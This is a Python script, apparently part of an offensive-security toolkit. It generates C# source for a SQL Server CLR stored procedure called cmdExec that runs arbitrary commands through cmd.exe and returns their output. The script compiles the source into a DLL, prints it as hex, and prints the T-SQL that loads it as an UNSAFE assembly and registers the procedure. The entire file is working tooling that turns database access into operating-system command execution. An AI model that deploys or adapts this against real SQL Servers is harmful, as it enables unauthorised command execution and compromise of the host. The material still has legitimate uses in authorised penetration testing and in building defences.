#!/bin/env python3
import ak
import binascii

FN_BASE = "win_sqlassembly"
FN_CS = FN_BASE + ".cs"
FN_DLL = FN_BASE + ".dll"

template = r"""
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
[Microsoft.SqlServer.Server.SqlProcedure]
public static void cmdExec (SqlString execCommand) {
	Process proc = new Process();
	proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
	proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
	proc.StartInfo.UseShellExecute = false;
	proc.StartInfo.RedirectStandardOutput = true;
	proc.Start();
	SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
	SqlContext.Pipe.SendResultsStart(record);
	record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record); SqlContext.Pipe.SendResultsEnd();
	proc.WaitForExit();
	proc.Close(); }
};
"""

ak.write_file(FN_CS, template)
ak.cs_compile(FN_CS, "/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")

# Convert to hex
with open(FN_DLL, 'rb') as f:
    content = f.read()
print(binascii.hexlify(content))
print("Load with: CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;")
print("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
